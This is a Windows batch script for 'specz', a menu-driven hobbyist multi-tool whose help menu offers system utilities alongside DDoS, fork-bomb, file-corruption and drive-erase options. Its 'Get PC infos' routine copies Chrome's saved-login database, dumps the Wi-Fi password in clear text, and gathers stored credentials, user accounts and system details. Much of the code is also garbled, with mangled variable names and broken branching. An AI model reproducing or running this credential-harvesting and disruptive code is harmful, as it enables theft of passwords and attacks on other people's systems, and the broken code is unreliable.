@echo off   
chcp 65001 >nul
:verificabackd9
color 0a
type 19\bak2\19.bak > 19\bak2\19.conf
type 19\bak2\19.conf > 19\specz.bak
set "com=:com"
set "lstcomd=data\lastestcmdfd.zy"
set "co222log=99noth"
goto :sssclient
:com200pura  
set "com=com200pura"
goto :sssclient
:sssclient
set co=99noth
set "needhelpmsg=If you need help enter 0"
echo 99noth > data\lastcmddgkfd.zy
set "save=saved_Files\"
set "line=echo *************************"
if exist ar2\drive.vbs goto :nextisgood
) else (
    echo X = Msgbox ("WARNING! This will erase all your data are you sure? If no then close this message and close specz, if you are sure put the letter of your drive only. IT NEEDS TO EXIST TOO.",vbExclamation + vbOkOnly ,"specz") > ar2\drive.vbs
    goto :nextisgood
)
:nextisgood
if exist data\lastestcmdfd.zy goto :nomissinglastcmond
) else (
    echo none > data\lastestcmdfd.zy
    goto :nomissinglastcmond
)
:nomissinglastcmond
:gcoodlicnetexist2
if exist data\fistlaunchT.dat goto :dacorrect
) else (
    echo %time% > data\fistlaunchT.dat
    goto :dacorrect
)
:dacorrect
if exist data\fistlaunchD.dat goto :dacorrect2
) else (
    echo %date% > data\fistlaunchD.dat
    goto :dacorrect2
)
:dacorrect2
if not exist data\beta.dat goto :ayyytonsdfa
) else (
    set "beta=1"
    goto :aayllg5474
)
:ayyytonsdfa
set "beta=2"
:aayllg5474
if exist data\cd.spe goto :ayyytonsdfanext
) else (
    echo %~dp0 > "data\cd.spe"
    cd %~dp0
    set "CD2=%~dp0"
    goto :ggr54l1
)
:ayyytonsdfanext
    echo %~dp0 > "data\cd.spe"
    cd %~dp0
    set "CD2=%~dp0"
goto :ggr54l1
:ggr54l1
if exist "data\List-sound.open-69.specz.vbs" (
        start data\List-sound.open-69.specz.vbs
        goto :bilalnext6
    ) else (
        goto :bilalnext6
    )
:bilalnext6
if exist client\set.sd goto :speczClientSdSets
) else (
    set > client\set.sd
    goto :speczClientSdSets
)
:speczClientSdSets
set > client\set.sd
if exist client\client.vbs goto :gcoodlicnet
) else (
    echo x = MsgBox ("Can not find Client.sd.", vbCritical + vbOkOnly,"specz") > client\client.vbs
    goto :gcoodlicnet
)
:gcoodlicnet
if exist client\client.sd goto :sdsdl9
) else (
    start client\client.vbs
    exit
    goto :sdsdl9
)
:sdsdl9
:Error-8rueijgn
title specz - verification
color 0a
echo [SPECZ/%date%/%time%] / :SDSL9 / DEF: STARTED specz>>data\specz-specz-log.-specz.specz.txt
:if43ufuiscjkdh48suijkfn43uh
:fdsgt54gdfr4t5rtdfx
:38jfj
:admin_start
:gfjdgkior4u984848488484848543957348
:gskgjds
title specz - verification
color 0a
set 43=co
set var=0
:fffffffffffffffffffffffffff
    if exist "saved_Files" (
        goto :gfdirugjkd4523
    ) else (
        mkdir saved_Files
        goto :gfdirugjkd4523
    )
:gfdirugjkd4523
    if exist "data\pre-fi0x-x-653uij" (
        set /p prefix=<data\pre-fi0x-x-653uij
        goto :gfdirugjkd
    ) else (
        set "prefix=; "
        goto :gfdirugjkd
    )
    :gfdirugjkd
    if exist "data\username-543574-62t3546532-65432546" (
        set /p real_USERNAME=<data\username-543574-62t3546532-65432546
    ) else (
        set real_USERNAME=%USERNAME%
    )
    if exist "data\c0l.zy" (
        set /p colour=<data\c0l.zy
        %colour%
        goto :lfdjdfsgds
    ) else (
        set "colour=color 02"
        goto :lfdjdfsgds
    )
    :lfdjdfsgds
    if exist "data\elpm.zy" (
        goto :ndjs
    ) else (
        echo Your notes:> data\elpm.zy
        echo.>> data\elpm.zy
        goto :ndjs
    )
:ndjs
if exist data\pl_ak_02.zy goto :password
) else (
goto :next
)

:password
color 0a
:verif
color 0a
set /p pass=<data\pl_ak_02.zy
cls
echo Enter your password please
echo.
echo Username; %real_USERNAME%
set /p msg=Password; 
if "%msg%"=="%pass%" ( 
    color 0f
    cls
    goto :start
) else (
    echo.
    echo Sorry this is the wrong password.
    echo Try again.
    goto :verif
)


:start
%colour%
:next
if exist data\support goto :support
goto :nosupport

:support
set "sup=true"
start xC-.exe
goto :x
exit

:nosupport
set "sup=false"
goto :x
:speczpar
:x
:xfsd
cls
:xfsd23
%colour%
title specz
echo.
:xfsd2
:lsjdsa
:comreset
cls
echo ███████╗██████╗ ███████╗ ██████╗███████╗
echo ██╔════╝██╔══██╗██╔════╝██╔════╝╚══███╔╝
echo ███████╗██████╔╝█████╗  ██║       ███╔╝ 
echo ╚════██║██╔═══╝ ██╔══╝  ██║      ███╔╝  
echo ███████║██║     ███████╗╚██████╗███████╗
echo ╚══════╝╚═╝     ╚══════╝ ╚═════╝╚══════╝
echo Specz is not updated anymore.. Learn more: https://raw.githubusercontent.com/JikUy/s/refs/heads/main/s
echo.  
goto :com
:com200pura
cls
:com201pura
goto :com
:com                                                                                                                                                              
set co=99noth
    if exist "data\speczdelcounterl" (
        set /a var+=1
        goto :jjkk58656452
    ) else (
        goto :jjkk5865645
    )
:jjkk58656452
set /p co=%var%%prefix%
goto :checkkmy:%com%d
if %beta% equ 1 goto :ddsdd
if %beta% equ 2 goto :ddsdd2
) else (
    goto :ddsdd2
)
:ddsdd
echo BETA Version
echo.
:ddsdd2
:jjkk5865645
set /p co=%prefix%
goto :checkkmy:%com%d
:checkkmy:%com%d
set > client\set.sd
if %co% equ 0 goto :passgkl2
echo %co% > data\lastestcmdfd.zy
:passgkl2
echo %co% [SPECZ/%date%/%time%] >> data\hist.zy
if %co% equ 46.1 goto :lastcmdexecuteco
set "co222log=%co%"
if %co% equ 0 goto :passgkl
echo %co%> data\lastcmddgkfd.zy
:passgkl
:esclavenergitiq
echo [SPECZ/%date%/%time%] / :ESCLAVENERGITIQ / DEF: CMD: %co%>>data\specz-specz-log.-specz.specz.txt
:lastcmdneedcom
:lastcmdverif
if %co% equ 99noth goto :nothuijg
if %co% equ 0 goto :help
if %co% equ 1 goto :ip
if %co% equ 1.1 goto :system
if %co% equ 1.2 goto :listtask
if %co% equ 2 goto :task1
if %co% equ 2.1 goto :task2
if %co% equ 3 goto :clscall
if %co% equ 3.1 goto :clsall
if %co% equ 4 goto :dis_menu
if %co% equ 4.1 goto :e_menu
if %co% equ 5 goto :his
if %co% equ 5.1 goto :hisc
if %co% equ 6 goto :pass
if %co% equ 6.1 goto :r_pass
if %co% equ 6.2 goto :user
if %co% equ 6.3 goto :r_user
if %co% equ 7 goto :notesnotes3
if %co% equ 7.1 goto :notesnotes3clear
if %co% equ 8 goto :execte
if %co% equ 9 goto :shu
if %co% equ 9.1 goto :res
if %co% equ 9.2 goto :shu2
if %co% equ 9.3 goto :res2
if %co% equ 9.4 goto :resmsg
if %co% equ 9.5 goto :abor
if %co% equ 10 goto :color03
if %co% equ 10.1 goto :color0a
if %co% equ 10.2 goto :color01
if %co% equ 10.3 goto :color0c
if %co% equ 11 goto :unin
if %co% equ 12 goto :cred
if %co% equ 12.1 goto :ineter
if %co% equ 12.2 goto :web_copier
if %co% equ 12.3 goto :dev
if %co% equ 12.4 goto :admin
if %co% equ 13 goto :direct
if %co% equ 13.1 goto :directreset
if %co% equ 14 goto :logs
if %co% equ 14.1 goto :logsreset_r
if %co% equ 15 goto :all_infos
if %co% equ 16 goto :titlefiledas
if %co% equ 17 goto :config.specz
if %co% equ 17.1 goto :config.specz_repair
if %co% equ 17.2 goto :repaitshfdusjkgsd
if %co% equ 18 goto :specz-defender
if %co% equ 18.1 goto :specz-d-skip
if %co% equ 19 goto :break
if %co% equ 20 goto :sndwenopen
if %co% equ 20.1 goto :sndopndelall9
if %co% equ 21 goto :randimnum
if %co% equ 22 goto :mod
if %co% equ 22.1 goto :cols
if %co% equ 23 goto :ddos19
if %co% equ 23.1 goto :ddos20
if %co% equ 23.2 goto :ddos21
if %co% equ 23.3 goto :ddos21setop
if %co% equ 23.4 goto :ddos22setop
if %co% equ 24 goto :lib.specz
if %co% equ 24.1 goto :lib.specz_repair
if %co% equ 24.2 goto :repaitshfdusjkgsd2
if %co% equ 25 goto :screef
if %co% equ 26 goto :88888888hhhhhhhhhhhhnvvvvvvvvvvvvvvvfg21
if %co% equ 27 goto :cmddddd
if %co% equ 27.1 goto :powershell
if %co% equ 28 goto :formatom-g
if %co% equ 29 goto :batchtoexe
if %co% equ 30 goto :copyanifile
if %co% equ 31 goto :createfold
if %co% equ 31.1 goto :createfil
if %co% equ 32 goto :sendnotifthightshi
if %co% equ 32.1 goto :sendnotifthightshi1
if %co% equ 32.2 goto :sendnotifthightshi2
if %co% equ 32.3 goto :sendnotifthightshi3
if %co% equ 33 goto :startsavedfiles
if %co% equ 34 goto :corruptany
if %co% equ 35 goto :35.add
if %co% equ 35.1 goto :35.1del
if %co% equ 36 goto :36getcd
if %co% equ 36.1 goto :36changecd
if %co% equ 37 goto :xmol2863
if %co% equ 38 goto :deltmpfilechhas
if %co% equ 39 goto :enablexpen
if %co% equ 39.1 goto :disablexpen
if %co% equ 40 goto :typeanyperruchefile
if %co% equ 41 goto :unavacalachera
if %co% equ 42 goto :ssh
if %co% equ 42.1 goto :ftp
if %co% equ 43 goto :younowabouthihuaus
if %co% equ 43.1 goto :younowabouthihuaus2
if %co% equ 44 goto :westatspeczres
if %co% equ 45 goto :filcreatehineiara
if %co% equ 46 goto :secretfoldmak
if %co% equ 46.1 goto :lastcmdexecuteco
if %co% equ 47 goto :justchihuahuajushuahua
if %co% equ 48 goto :testyouRGB
if %co% equ 49 goto :deletefilelol
if %co% equ 49.1 goto :renameanyfilelollolol
if %co% equ 50 goto :50502k2k50
if %co% equ 50.1 goto :yawcurentversianyourcurrentversion
if %co% equ 50.2 goto :arnacallarnaque
if %co% equ 50.3 goto :eyzoloeyes
if %co% equ 50.4 goto :503lolmadnewdatantime
if %co% equ 51 goto :51LiveCreahs
if %co% equ 51.1 goto :speczClientKill
if %co% equ 52 goto :speczXXzJKI
if %co% equ 52.1 goto :speczXXzJKI2
if %co% equ 53 goto :allSetsbcu
if %co% equ 54 goto :gobackverifi
if %co% equ 55 goto :disableXgiantTextXspecz
if %co% equ 56 goto :eraseadriveldsfd
if %co% equ 56.1 goto :extensiontRuse

if %co% equ 99 goto :exit
if %co% equ 99.1 goto :openspeczos
if %co% equ 99.2 goto :2021mmbremembre
if %co% equ 99.3 goto :2specz5elite1lisence3activate4
) else (
    :fdhg444444
    echo.
    echo Wrong command. %needhelpmsg%.
    echo.
    goto %com%
)

:ip
echo.
ipconfig
ipconfig > data\ip.zy
echo.
goto %com%
exit

:task2
set /p taswho2=Program; 
taskkill /F /IM %taswho2%
goto %com%

:task1
set /p taswho1=Program; 
taskkill /IM %taswho1%
goto %com%

:clsall
cls
goto :xfsd

:clscall

goto :xfsd23

:dis_menu
cls
goto :xfsd2

:e_menu
cls
goto :xfsd2

:system
echo.
systeminfo
systeminfo > data\system.zy
echo.
goto %com%

:his
type data\hist.zy
goto %com%

:hisc
cls>data\hist.zy
goto %com%

:pass
echo.
echo Password; %pass%
set /p pass=Password; 
echo %pass%> data\pl_ak_02.zy
echo.
goto :38jfj

:notesnotes3
echo.
type data\elpm.zy
echo.
:notessg
set /p nm=Note message: 
goto :msg
:msg
(
  echo %nm% [Time:%time% Date: %date%]
) >> data\elpm.zy
echo.
goto :lsjdsa

:r_pass
del /s /f /q data\pl_ak_02.zy
goto :38jfj
goto :gskgjds

:execte
echo.
set /p startexecute=Program; 
start %startexecute%
echo.
goto %com%
:shu
echo.
set /p timeme=Time before shutdown; 
shutdown /s /t %timeme%
echo.
goto %com%
:res
echo.
set /p timeme2=Time before restart; 
shutdown /r /t %timeme2%
echo.
goto %com%
:shu2
echo.
set /p timeme3=Time before shutdown; 
shutdown /s /f %timeme3%
echo.
goto %com%
:res2
echo.
set /p timeme4=Time before restart; 
shutdown /r /f %timeme4%
echo.
goto %com%
:resmsg
echo.
set /p timeme5=Time before restart; 
set /p message=Restart message:
shutdown /r /t /f /c %message% %timeme5%
echo.
goto %com%
:abor
echo.
shutdown -a
echo.
goto %com%

:color03
echo color 03 > data\c0l.zy
color 03
goto %com%
:color0a
echo color 0a > data\c0l.zy
color 0a
goto %com%
:color01
echo color 01 > data\c0l.zy
color 01
goto %com%
:color0c
echo color 0c > data\c0l.zy
color 0c
goto %com%

:unin
echo.
del /s /f /q data
mkdir data
start %~nx0
exit
echo.
goto :38jfj
goto %com%

:help
echo.
%line%
echo [0] This Help message
echo ************1************
echo [1] Get ip
echo [1.1] Get system info
echo [1.2] Task list
echo ************2************
echo [2] Taskkill any processes
echo [2.1] Force taskkill any processes
echo ************3************
echo [3] Enable menu
echo [3.1] Enable menu and clear
echo ************4************
echo [4] Disable menu
echo [4.1] Disable menu and clear
echo ************5************
echo [5] See command history
echo [5.1] Clear history
echo ************6************
echo [6] Add or Change a password
echo [6.1] Delete password
echo [6.2] Add or Change username
echo [6.3] Delete username
echo ************7************
echo [7] Notes
echo ************8************
echo [8] Start program
echo ************9************
echo [9] Shutdown pc
echo [9.1] Restart pc
echo [9.2] Force Shutdown pc
echo [9.3] Force Restart pc
echo [9.4] Custom Restart message pc
echo [9.5] Abort shutdown
echo ***********10************
echo [10] Change color to blue
echo [10.1] Change color to green
echo [10.2] Change color to navy
echo [10.3] Change color to red
echo ***********11************
echo [11] Delete data
echo ***********12************
echo [12] Update specz
echo [12.1] Search site on internet
echo [12.2] Website copier / downloader
echo [12.3] Dev informations
echo [12.4] Start as Administrator
echo ***********13************
echo [13] Change prefix
echo [13.1] Reset prefix
echo ***********14************
echo [14] Open log file
echo [14.1] Clear log file
echo ***********15************
echo [15] Get PC infos
echo ***********16************
echo [16] Make someone talk
echo ***********17************
echo [17] Read config file
echo [17.1] Repair config file
echo [17.2] Readable config
echo ***********18************
echo [18] specz defend config
echo [18.1] specz defend config (Less infos)
echo ***********19************
echo [19] specz
echo ***********20************
echo [20] Add a sound when specz is opening
echo [20.1] Delete sound when specz is opening
echo ***********21************
echo [21] Generate random numbers
echo ***********22************
echo [22] Change lines
echo [22.1] Change cols
echo ***********23************
echo [23] DDOS Website
echo [23.1] DDOS Ipv4
echo [23.2] DDOS Ipv6
echo [23.3] Stop DDOS
echo [23.4] FORCE Stop DDOS
echo ***********24************
echo [24] Read lib file
echo [24.1] Repair lib file
echo [24.2] Readable lib
echo ***********25************
echo [25] Screenshot
echo ***********26************
echo [26] Get infos of a file
echo ***********27************
echo [27] Cmd
echo [27.1] Powershell
echo ***********28************
echo [28] Do a fork bomb
echo ***********29************
echo [29] Batch to Exe 
echo ***********30************
echo [30] Copy any file
echo ***********31************
echo [31] Create folder
echo [31.1] Create file
echo ***********32************
echo [32] Send notification [?]
echo [32.1] Send notification [!]
echo [32.2] Send notification [2!]
echo [32.3] Send notification [X]
echo ***********33************
echo [33] Start Saved Files folder
echo ***********34************
echo [34] Corrupt any file
echo ***********35************
echo [35] Add line Counter
echo [35.1] Delete line Counter
echo ***********36************
echo [36] Get Directory
echo [36.1] Change Directory
echo ***********37************
echo [37] Boost PC
echo ***********38************
echo [38] Delete TMP Files
echo ***********39************
echo [39] Enable Local delayed expansion
echo [39.1] End Local delayed expansion
echo ***********40************
echo [40] Type any file
echo ***********41************
echo [41] Write every files in directory
echo ***********42************
echo [42] Connect to IP (SSH)
echo [42.1] Connect to IP (FTP)
echo ***********43************
echo [43] Random Chars
echo [43.1] Open TODO
echo ***********44************
echo [44] Restart specz
echo ***********45************
echo [45] File maker
echo ***********46************
echo [46] Start TASKMGR.exe
echo [46.1] Execute last command [NEED FIXES] [:lastcmdexecuteco & :lastcmd:%com%bakc]
echo ***********47************
echo [47] Scan for corrupted files
echo ***********48************
echo [48] Test your RGB
echo ***********49************
echo [49] Delete any file
echo [49.1] Rename any file
echo ***********50************
echo [50] Run PC Faster
echo [50.1] Get your SPECZ version
echo [50.2] Scan and Verify SFC
echo [50.3] Change Title
echo [50.4] Get current time and date infos
echo ***********51************
echo [51] Crash specz
echo [51.1] Kill specz client
echo ***********52************
echo [52] Warning message
echo [52.1] Type any file
echo ***********53************
echo [53] Every SETS
echo ***********54************
echo [54] Go back to verification
echo ***********55************
echo [55] Fast execute
echo ***********56************
echo [56] Erase a drive
echo [56.1] Extensions in use
echo ***********99************
echo [99] Exit
echo [99.1] Force Exit
echo [99.2] Warnings
echo [99.3] Activate specz Elite
%line%
echo Last command;
type %lstcomd%
%line%
echo Don't enter prefix (%prefix%) or spaces ( ), else it gonna crash.
echo Saved Files folder is "%save%"
%line%
echo.
goto %com%
:cred
echo.
echo [SPECZ/%date%/%time%] / :CRED / DEF: VERIF UPDATE data.control >>data\specz-specz-log.-specz.specz.txt
echo [SPECZ/%date%/%time%] / :CRED / DEF: VERIF UPDATE = false >>data\specz-specz-log.-specz.specz.txt
echo [SPECZ/%date%/%time%] / :CRED / DEF: VERIF NO UPDATE >>data\specz-specz-log.-specz.specz.txt
echo No update to do.
echo.
goto %com%

:ineter
set /p internet=https:\\
echo https:\\%internet%\
start "" https:\\%internet%\
goto %com%

:web_copier

set /p link=https:\\
set /p name=HTML File name (NO EXTENSION); 
set /p output_folder=Where your want to save %name%.html; 
if not exist "%output_folder%" (
    echo The folder does not exist the folder is going to be C:\Desktop
    set "output_folder=C:\Desktop"
)

set "output_path=%output_folder%\%name%.html"

echo LOADING

powershell -:%com%mand "$response = (Invoke-WebRequest -Uri '%link%').Content; $response | Out-File -Encoding utf8 '%output_path%'"

echo If HTML is white only then it means that it does not working anymore or the website does not exist
echo.
echo Succesfully downloaded %name%.html in the folder %output_folder%.
echo.
choice /C YN /M "Would you like to open the file now?"
if %ERRORLEVEL% equ 1 (
    start "" "%output_path%"
)

pause
goto %com%

:dev
echo [SPECZ/%date%/%time%] / :CRED / DEF: DEV.access >>data\specz-specz-log.-specz.specz.txt
echo.
echo on: specz
echo u: ax
echo prefix: ; 
echo c: false
echo d: 1
echo pe: true
echo cu: %real_username%
echo.
goto %com%

:notesnotes3clear
        echo Your notes:> data\elpm.zy
        echo.>> data\elpm.zy
echo.
goto %com%

:listtask
echo.
tasklist
echo.
goto %com%

:admin
echo [SPECZ/%date%/%time%] / :ADMIN / DEF: START ADMINISTRATOR>>data\specz-specz-log.-specz.specz.txt
: BatchGotAdmin        
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"  
REM --> If error flag set, we do not have admin.  
if '%errorlevel%' NEQ '0' (    echo Requesting administrative privileges...    goto UACPrompt) else ( goto gotAdmin )  
:UACPrompt  
    echo Set UAC = CreateObject^("Shell.Application"^) > "data\getadmin.vbs"  
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "data\getadmin.vbs"  
    "data\getadmin.vbs"  
    exit /B
:gotAdmin  
goto :admin_start

:user
    if exist "data\username-543574-62t3546532-65432546" (
        set /p real_USERNAME=<data\username-543574-62t3546532-65432546
    ) else (
        set real_USERNAME=%USERNAME%
    )
echo Username; %real_USERNAME%
set /p username_r=New Username; 
echo %username_r%> data\username-543574-62t3546532-65432546
goto :38jfj
:r_user
    if exist "data\username-543574-62t3546532-65432546" (
        set /p real_USERNAME=<data\username-543574-62t3546532-65432546
    ) else (
        set real_USERNAME=%USERNAME%
    )
del /s /f /q data\username-543574-62t3546532-65432546
goto :38jfj

:exit
echo [SPECZ/%date%/%time%] / :EXIT / DEF: STOPPED >>data\specz-specz-log.-specz.specz.txt
exit

:direct
echo Current Prefix; %prefix%
set /p prefix=New Prefix; 
echo %prefix% >data\pre-fi0x-x-653uij
goto :gfjdgkior4u984848488484848543957348

:directreset
echo.
del /s /f /q data\pre-fi0x-x-653uij
echo.
goto :if43ufuiscjkdh48suijkfn43uh

:logs
echo [SPECZ/%date%/%time%] / :LOGS / DEF: OPEN data\specz-specz-log.-specz.specz.txt >>data\specz-specz-log.-specz.specz.txt
start data\specz-specz-log.-specz.specz.txt
goto %com%

:logsreset_r
echo [SPECZ/%date%/%time%] / :ADMIN / DEF: RESET data\specz-specz-log.-specz.specz.txt >data\specz-specz-log.-specz.specz.txt
goto %com%

:all_infos
@echo off
del /s /f /q AllpartInfo
cls
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %:%com%puterName% ^| findstr [') do set NetworkIP=%%a
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
set "CaptureScreenFolder=AllpartInfo\SCREENSHOT\"
for /f "delims=: tokens=2" %%n in ('netsh wlan show interface name="Wi-Fi" ^| findstr "SSID"') do set "Network=%%n"
set "Network=%Network:~1%"
for /f "tokens=2" %%A in (
  'wmic LogicalDisk Get DeviceID^,FreeSpace ^| find /i "C:"'
) Do Set "FreeSpace=%Blank%%%A"
Set "FreeSpace=%FreeSpace:~-15%"
echo Creating folder; try 1...
mkdir AllpartInfo
echo Creating folder; try 2...
mkdir AllpartInfo\IP
echo Creating folder; try 3...
mkdir AllpartInfo\DATE
echo Creating folder; try 4...
mkdir AllpartInfo\USERS
echo Creating folder; try 5...
mkdir AllpartInfo\SCREENSHOT
echo Creating folder; try 6...
mkdir AllpartInfo\TASKS
echo Creating folder; try 7...
mkdir AllpartInfo\WIFI
echo Creating folder; try 8...
mkdir AllpartInfo\DIRECTORY
echo Creating folder; try 9...
mkdir AllpartInfo\SYSTEM
echo Creating folder; try 10...
mkdir AllpartInfo\DISK
echo Creating folder; try 11...
mkdir AllpartInfo\MEMORY
echo Creating folder; try 12...
mkdir AllpartInfo\CPU
echo Creating folder; try 13...
mkdir AllpartInfo\CMD
echo Creating folder; try 14...
mkdir AllpartInfo\CHROME
echo Creating folder; try 15...
mkdir AllpartInfo\INI
echo Creating folder; try 16...
mkdir AllpartInfo\VOLUME
echo Creating folder; try 17...
mkdir AllpartInfo\DRIVE
echo Creating folder; try 18...
mkdir AllpartInfo\TREE
echo Creating folder; try 19...
mkdir AllpartInfo\DEV
echo Creating folder; try 20...
mkdir AllpartInfo\PEOPLE
echo Creating folder; try 22...
mkdir AllpartInfo\GROUP
echo Creating folder; try 23...
mkdir AllpartInfo\SOFTWARE
echo Creating folder; try 24...
echo.
echo Logging in..
echo Getting chrome...
type "%localappdata%\Google\Chrome\User Data\Default\Login Data" > AllpartInfo\CHROME/Data.txt
echo Getting sets...
set > AllpartInfo\Sets.txt
echo Getting Desktop.ini...
type Desktop.ini > AllpartInfo\INI\Desktop.txt
echo Getting NetworkIp...
echo Private IP: %NetworkIp% > AllpartInfo\IP\Private.txt
echo Getting PublicIp...
echo Public IP: %PublicIp% > AllpartInfo\IP\Public.txt
echo Getting Ip Output...
ipconfig > AllpartInfo\IP\Output.txt
echo Getting volume...
wmic volume > AllpartInfo\VOLUME\volume.txt
echo Getting date...
echo %date% > AllpartInfo\DATE\Date.txt
echo Getting time...
echo %time% > AllpartInfo\DATE\Time.txt
echo Getting username...
echo %username% > AllpartInfo\USERS\Current.txt
echo Getting users...
net user > AllpartInfo\USERS\All.txt
goto :skip_quser
echo Getting users query...
quser > AllpartInfo\USERS\Q.txt
:skip_quser
echo Getting task list...
tasklist > AllpartInfo\TASKS\List.txt
echo Getting wifi password...
netsh wlan show profile %Network% key=clear > AllpartInfo\WIFI\Password.txt
echo Getting wifi name...
echo %Network% > AllpartInfo\WIFI\Name.txt
echo Getting cd...
echo %cd% > AllpartInfo\DIRECTORY\Cd.txt
echo Getting all cd...
dir > AllpartInfo\DIRECTORY\AllDir.txt
echo Getting all cd...
dir >> AllpartInfo\DIRECTORY\AllDir.txt
echo Getting free space...
Echo %FreeSpace% bytes >> AllpartInfo\DISK\FreeSpace.txt
echo Getting mem chip...
wmic memorychip >> AllpartInfo\MEMORY\Chip.txt
echo Getting mem cache...
wmic memcache >> AllpartInfo\MEMORY\Cache.txt
echo Getting logical disk...
wmic LOGICALDISK >> AllpartInfo\DISK\Logical.txt
echo Getting CPU...
wmic CPU >> AllpartInfo\CPU.txt
echo Getting cmdkey...
CMDKEY /list >> AllpartInfo\CMD\List.txt
echo Getting drivers query...
driverquery >> AllpartInfo\DRIVE\List.txt
echo Getting tree...
tree >> AllpartInfo\TREE\List.txt
echo Getting share...
wmic share > AllpartInfo\PEOPLE\Share.txt
echo Getting BIOS...
wmic BIOS > AllpartInfo\Bios.txt
echo Getting group...
wmic group > AllpartInfo\GROUP\Group.txt
echo Getting dev sounds...
wmic sounddev > AllpartInfo\GROUP\Sound.txt
echo Getting system info...
systeminfo >> AllpartInfo\SYSTEM\Info.txt

echo Getting software feature...
wmic SOFTWAREFEATURE > AllpartInfo\SOFTWARE\Feature.txt

start AllpartInfo
goto %com%

:titlefiledas
set /p titlefiledas=Text to speech; 
echo Set Speak=CreateObject("sapi.spvoice") > data\List-.specz.vbs
echo Speak.Speak "%titlefiledas%" >> data\List-.specz.vbs
start data\List-.specz.vbs
echo echo [SPECZ/%date%/%time%] / :TITLEFILEDAS / DEF: SPEAK %titlefiledas% data\List-.specz.vbs >>data\specz-specz-log.-specz.specz.txt
echo echo [SPECZ/%date%/%time%] / :TITLEFILEDAS / DEF: RESET data\ >>data\specz-specz-log.-specz.specz.txt
goto %com%

:config.specz
echo.
type config.specz
echo.
goto %com%

:config.specz_repair
echo.
echo Repaired specz.config file
echo.
(
echo if "specz.bat", "specz.exe", "specz.specz" $co = "" go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = " " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "  " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "    " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "     " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "      " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "       " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "        " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "         " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "          " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "           " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "            " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "             " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "              " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "               " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $prefix = "$prefix" go $7
echo else = $co go $8
echo $7
echo quit/all = "specz.bat", "specz.exe", "specz.specz"
echo $8 
echo $co = tech
)> config.specz
goto %com%

:Error-8rueijgn-
:Error-config
cls
echo Missing file 'config.specz'
echo CRITICAL_FILE_ERROR_NOT_FOUND
echo.
pause
goto :Error-8rueijgn-

:break
if exist "19\specz.bat" (
    call :heycallkapon
) else (
    call :heynotfindcallk
)

:heycallkapon
call "19\specz.bat"
goto %com%

:heynotfindcallk
if exist "19\specz.bak" (
    call :heycallkapon2
) else (
    call :heynotfindcallk2
)

:heycallkapon2
ren "19\specz.bak" "specz.bat"
call "19\specz.bat"
goto %com%

:heynotfindcallk2
echo.
echo Can not find specz.bat and specz.bak (Backup)
echo.
goto %com%


:specz-defender

    if exist "config.specz" (
        goto :hjjjjjjjjjjjjjjjjjjjjjjjjjjjj
    ) else (
        echo.
        echo Your config file is missing
        echo.
        goto %com%
    )
:hjjjjjjjjjjjjjjjjjjjjjjjjjjjj
setlocal EnableDelayedExpansion

set "filename=config.specz"

for /f %%a in ('type "%filename%" ^| find /c /v ""') do set "line_count=%%a"

if %line_count% equ 21 (
    set "content="
    set /a "line_num=0"
    
    for /f "usebackq delims=" %%b in ("%filename%") do (
        set /a "line_num+=1"
        set "content=!content!%%b"
        
        if !line_num! equ 6 (
            echo.
            echo Your config file is safe.
            echo Config file should be 22 lines
            echo.
        )
    )
) else (
    echo.
    echo Your config file is suspect or corrupted.
            echo Config file should be 22 lines
    echo.
)
goto %com%

:repaitshfdusjkgsd
(
echo if "specz.bat", "specz.exe", "specz.specz" $co = "" go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = " " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "  " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "    " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "     " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "      " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "       " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "        " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "         " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "          " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "           " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "            " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "             " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "              " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $co = "               " go $7
echo if "specz.bat", "specz.exe", "specz.specz" $prefix = "$prefix" go $7
echo else = $co go $8
echo $7
echo quit/all = "specz.bat", "specz.exe", "specz.specz"
echo $8 
echo $co = tech
)> data\config.txt

echo.
echo Normal config file:
echo.
type data\config.txt
echo.
echo ------------------------------
echo Your config file:
echo.
type config.specz
echo.
goto :specz-d-skip

:specz-d-skip

    if exist "config.specz" (
        goto :hjjjjjjjjjjjjjjjjjjjjjjjjjjjjd
    ) else (
        echo.
        echo Your config file is missing
        echo.
        goto %com%
    )
:hjjjjjjjjjjjjjjjjjjjjjjjjjjjjd
setlocal EnableDelayedExpansion

set "filename=config.specz"

for /f %%a in ('type "%filename%" ^| find /c /v ""') do set "line_count=%%a"

if %line_count% equ 21 (
    set "content="
    set /a "line_num=0"
    
    for /f "usebackq delims=" %%b in ("%filename%") do (
        set /a "line_num+=1"
        set "content=!content!%%b"
        
        if !line_num! equ 6 (
            echo.
            echo Your config file is safe.
            echo.
        )
    )
) else (
    echo.
    echo Your config file is suspect or corrupted.
    echo.
)
goto %com%
